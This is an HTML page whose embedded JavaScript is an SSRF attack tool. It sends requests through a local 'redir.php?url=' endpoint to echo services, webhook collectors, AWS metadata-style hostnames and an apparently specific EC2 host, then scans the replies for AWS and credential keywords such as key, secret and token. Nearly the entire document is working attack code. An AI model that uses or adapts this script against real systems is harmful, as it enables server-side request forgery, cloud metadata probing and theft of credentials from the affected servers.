<!DOCTYPE html>
<html>
<head>
    <title>External Reflection Attack</title>
</head>
<body>
    <h1>ü™û External Service Reflection Attack</h1>
    <div id="results"></div>
    
    <script>
        var results = "";
        
        // Since external requests work, use services that might reflect internal info
        var reflectionServices = [
            // Services that reflect headers (might show internal environment)
            'http://httpbin.org/headers',
            'http://httpbin.org/anything',
            'http://httpbin.org/anything/test',
            'http://postman-echo.com/get',
            'http://postman-echo.com/headers',
            
            // Services that might trigger different behavior
            'http://httpbin.org/status/500',
            'http://httpbin.org/delay/1',
            'http://httpbin.org/redirect/1',
            
            // Try to access webhook services (might reveal IP/environment)
            'http://webhook.site/unique-id',
            'http://requestbin.com',
            
            // Try to trigger error messages that might leak info
            'http://httpbin.org/status/404',
            'http://httpbin.org/xml',
            'http://httpbin.org/html',
            
            // Test different protocols if supported
            'https://httpbin.org/get',
            'https://httpbin.org/headers',
            
            // Try FTP if supported (might reveal more info)
            'ftp://httpbin.org',
            
            // Try different ports on httpbin.org
            'http://httpbin.org:8080/',
            'http://httpbin.org:443/',
            
            // Test internal domains that might be accessible externally
            'http://metadata.amazonaws.com',
            'http://169.254.169.254.amazonaws.com',
            
            // Check if we can reach other AWS services
            'http://s3.amazonaws.com',
            'http://ec2.amazonaws.com',
            
            // Try to access the target server from external perspective
            'http://54.209.100.76.amazonaws.com',
            'http://ec2-54-209-100-76.compute-1.amazonaws.com'
        ];
        
        for(var i = 0; i < reflectionServices.length; i++) {
            try {
                results += "<h3>ü™û " + reflectionServices[i] + "</h3>";
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'http://localhost/redir.php?url=' + reflectionServices[i], false);
                xhr.send();
                
                if(xhr.responseText && xhr.responseText.length > 10) {
                    results += "<div style='background:#e8f5e8;padding:8px;border:1px solid green;'>üì° RESPONSE: " + xhr.responseText.length + " bytes</div>";
                    
                    // Look for AWS-related information in response
                    var text = xhr.responseText.toLowerCase();
                    if(text.includes('aws') || text.includes('amazon') || text.includes('ec2') || text.includes('s3')) {
                        results += "<div style='background:#ff6b6b;color:white;padding:5px;'>üö® AWS KEYWORDS DETECTED! üö®</div>";
                    }
                    
                    // Look for credential-like strings
                    if(text.includes('key') || text.includes('secret') || text.includes('token') || text.includes('credential')) {
                        results += "<div style='background:#ffa500;color:white;padding:5px;'>üîë CREDENTIAL KEYWORDS FOUND!</div>";
                    }
                    
                    results += "<div style='background:#f0f0f0;padding:8px;max-height:100px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "</div>";
                } else {
                    results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå No significant response</div>";
                }
            } catch(e) {
                results += "<div style='background:#ffe8e8;padding:3px;'>‚ùå " + e.message.substring(0, 50) + "</div>";
            }
        }
        
        document.getElementById("results").innerHTML = results;
    </script>
</body>
</html>
